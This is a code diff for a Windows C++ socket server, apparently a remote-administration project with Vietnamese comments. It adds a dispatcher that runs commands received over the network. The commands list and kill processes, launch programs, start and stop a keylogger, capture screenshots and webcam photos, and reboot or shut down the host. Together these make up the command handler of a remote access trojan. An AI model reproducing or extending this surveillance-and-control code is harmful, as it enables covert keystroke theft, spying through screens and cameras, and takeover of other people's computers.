@@ -1,15 +1,4 @@
-#include <WinSock2.h>
-#include <WS2tcpip.h>
-#include <iostream>
-#include <string>
-#include <fstream>
-#include <cstdint>
-#include "../includes/process_utils.h"
-#include "../includes/keylogger.h"
-#include <algorithm>
-#include <thread>
-
-#pragma comment(lib, "ws2_32.lib")
+#include "../includes/tasks.h"
 
 void receiveResponse(SOCKET clientSock)
 {
@@ -119,6 +108,133 @@ void receiveFile(SOCKET sock)
     std::cout << "File content received from client." << std::endl;
 }
 
+void handleCommand(SOCKET sock, const std::string& cmd)
+{
+    if (cmd == "help")
+    {
+        std::string helpMsg = 
+            "Available commands:\n"
+            "  help                    - Show this help message\n"
+            "  list                    - List all running processes\n"
+            "  start <path>            - Start a process from given path\n"
+            "  stop <process_name>     - Stop a process by name\n"
+            "  start_keylogger         - Start keylogger\n"
+            "  stop_keylogger          - Stop keylogger\n"
+            "  screenshot <filename>   - Capture screen and save as PNG\n"
+            "  webcam_photo <filename> - Capture single webcam photo\n"
+            "  restart                 - Restart the system\n"
+            "  shutdown                - Shutdown the system\n"
+            "  exit                    - Disconnect from server\n";
+        send(sock, helpMsg.c_str(), helpMsg.size(), 0);
+    }
+    else if (cmd == "list")
+    {
+        std::string processes = listProcesses();
+        send(sock, processes.c_str(), processes.size(), 0);
+    }
+    else if (cmd.rfind("start ", 0) == 0)
+    {
+        std::string path = cmd.substr(6);
+        bool ok = startProcess(path);
+        
+        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else if (cmd.rfind("stop ", 0) == 0)
+    {
+        std::string name = cmd.substr(5);
+        bool ok = stopProcess(name);
+        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else if (cmd == "start_keylogger")
+    {
+        startKeylogger();
+        std::string msg = "Keylogger started.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else if (cmd == "stop_keylogger")
+    {
+        stopKeylogger();
+        std::string msg = "Keylogger stopped.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else if (cmd.rfind("screenshot ", 0) == 0)
+    {
+        std::string filename = cmd.substr(11);
+        if (filename.empty())
+        {
+            filename = "screenshot.png";
+        }
+        // Thêm extension .png nếu chưa có
+        if (filename.find(".png") == std::string::npos && 
+            filename.find(".PNG") == std::string::npos)
+        {
+            filename += ".png";
+        }
+        
+        bool success = captureScreen(filename);
+        std::string msg = success ? 
+            "Screenshot captured successfully: " + filename : 
+            "Failed to capture screenshot.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else if (cmd == "restart")
+    {
+        std::string msg = "Initiating system restart...";
+        send(sock, msg.c_str(), msg.size(), 0);
+        
+        // Delay một chút để gửi response trước khi restart
+        Sleep(1000);
+        
+        bool success = restartSystem();
+        if (!success)
+        {
+            std::string errorMsg = "Failed to restart system.";
+            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
+        }
+        // Nếu restart thành công, connection sẽ bị đóng do máy restart
+    }
+    else if (cmd == "shutdown")
+    {
+        std::string msg = "Initiating system shutdown...";
+        send(sock, msg.c_str(), msg.size(), 0);
+        
+        // Delay một chút để gửi response trước khi shutdown
+        Sleep(1000);
+        
+        bool success = shutdownSystem();
+        if (!success)
+        {
+            std::string errorMsg = "Failed to shutdown system.";
+            send(sock, errorMsg.c_str(), errorMsg.size(), 0);
+        }
+        // Nếu shutdown thành công, connection sẽ bị đóng do máy tắt
+    }
+    else if (cmd.rfind("webcam_photo ", 0) == 0)
+    {
+        std::string filename = cmd.substr(13); // Remove "webcam_photo "
+        if (filename.empty())
+        {
+            filename = "webcam_photo.jpg";
+        }
+        
+        std::string startMsg = "Capturing webcam photo: " + filename + "...";
+        send(sock, startMsg.c_str(), startMsg.size(), 0);
+        
+        bool success = captureWebcamPhoto(filename);
+        std::string msg = success ? 
+            "Webcam photo captured successfully: " + filename : 
+            "Failed to capture webcam photo.";
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+    else
+    {
+        std::string msg = "Unknown command: " + cmd;
+        send(sock, msg.c_str(), msg.size(), 0);
+    }
+}
+
 int main()
 {
     WSADATA wsa;
@@ -152,24 +268,23 @@ int main()
     }
     std::cout << "Client connected." << std::endl;
 
+    char buffer[1024];
     while (true)
     {
-        std::string cmd;
-        std::cout << '\n';
-        std::getline(std::cin, cmd);
+        // Nhận lệnh từ client
+        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
+        if (len <= 0) 
+        {
+            std::cout << "Client disconnected." << std::endl;
+            break;
+        }
 
-        if (cmd == "exit")
-        {
-            std::cout << "Exiting server." << std::endl;
-            break;
-        }
-        if (send(clientSock, cmd.c_str(), cmd.size(), 0) == SOCKET_ERROR)
-        {
-            std::cerr << "Failed to send command to client." << std::endl;
-            break;
-        }
-        std::cout << "Command sent: " << cmd << std::endl;
-        receiveResponse(clientSock);
+        buffer[len] = '\0';
+        std::string cmd(buffer);
+        std::cout << "Received command from client: " << cmd << std::endl;
+        
+        // Xử lý lệnh trên server
+        handleCommand(clientSock, cmd);
     }
 
     closesocket(clientSock);
